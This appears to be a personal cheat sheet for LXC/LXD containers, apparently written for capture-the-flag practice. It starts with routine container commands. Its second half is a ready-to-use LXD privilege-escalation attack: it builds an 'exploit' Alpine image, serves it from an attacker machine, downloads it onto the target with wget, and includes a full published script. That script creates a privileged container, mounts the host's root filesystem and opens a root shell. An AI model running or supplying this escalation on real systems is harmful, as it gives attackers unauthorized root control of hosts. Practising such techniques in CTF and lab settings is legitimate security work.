#cheatsheets #lxc #lxd  

### generic commands
lxd version
```
$ lxd version
```
lxc version
```
$ lxc version
```
list storage pools
```
$ lxc storage list
```
get a new image (alpine)
```
$ lxc launch images:alpine/3.10 alpine01
```
get a new image (ubuntu)
```
$ lxc launch ubuntu:16.04
```
list images
```
$ lxc image list
```
list instances (containers)
```
$ lxc list
```
copy instances
```
$ lxc copy alpine01 alpine02
```
starting instance
```
$ lxc start alpine02
```
stopping instance
```
$ lxc stop alpine02
```
moving or renaming instance
```
$ lxc move alpine02 alpine03
```
accessing instance(container) ubuntu
```
$ lxc exec ubuntu01 bash
root@ubuntu01:~# hostname
ubuntu01
```
*be aware that you use the shell instance for that distribution*
accessing instance(container) alpine
```
$ lxc exec alpine02 ash
~ # hostname
alpine02
```
*alpine linux uses ash shell*

### stages to create container for transport
create image
```
$ lxc init images:alpine/3.10 exploit
```
check created by listing
```
$ lxc list
```
start instance
```
$ lxc start exploit
```
list to confirm started
```
$ lxc list
```
log in to check that it works
```
$ lxc exec exploit ash
~ # pwd
/root
~ # exit
```
stop instance
```
$ lxc stop exploit
```
publish the instance (and name)
```
$ lxc publish exploit --alias exploit-image
```
export instance to tar.gz
```
$ lxc image export exploit-image 
```
amend name to simplify matters
```
$ mv 7e17661f0e6aef740c97f8399746208297b001d676331ab4f467d400556f5cad.tar.gz CTF/0x41414141CTF/exploit-001.tar.gz
```
set up an http server on the attacker machine
```
/CTF/0x41414141CTF$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
transfer file from attacker to target by wget
```
$ wget http://10.10.10.10:8000/exploit-001.tar.gz
```
upload or copy and paste to known exploit shell file.
```bash
#!/usr/bin/env bash

# ----------------------------------
# Authors: Marcelo Vazquez (S4vitar)
#	   Victor Lasa      (vowkin)
# ----------------------------------

# Step 1: Download build-alpine => wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine [Attacker Machine]
# Step 2: Build alpine => bash build-alpine (as root user) [Attacker Machine]
# Step 3: Run this script and you will get root [Victim Machine]
# Step 4: Once inside the container, navigate to /mnt/root to see all resources from the host machine

function helpPanel(){
  echo -e "\nUsage:"
  echo -e "\t[-f] Filename (.tar.gz alpine file)"
  echo -e "\t[-h] Show this help panel\n"
  exit 1
}

function createContainer(){
  lxc image import $filename --alias alpine && lxd init --auto
  echo -e "[*] Listing images...\n" && lxc image list
  lxc init alpine privesc -c security.privileged=true
  lxc config device add privesc giveMeRoot disk source=/ path=/mnt/root recursive=true
  lxc start privesc
  lxc exec privesc sh
  cleanup
}

function cleanup(){
  echo -en "\n[*] Removing container..."
  lxc stop privesc && lxc delete privesc && lxc image delete alpine
  echo " [√]"
}

set -o nounset
set -o errexit

declare -i parameter_enable=0; while getopts ":f:h:" arg; do
  case $arg in
    f) filename=$OPTARG && let parameter_enable+=1;;
    h) helpPanel;;
  esac
done

if [ $parameter_enable -ne 1 ]; then
  helpPanel
else
  createContainer
fi
```
change modification of file to allow execution.
```
$ chmod +x exploit.sh
```
run file and exploit
```
$ ./exploit.sh
```

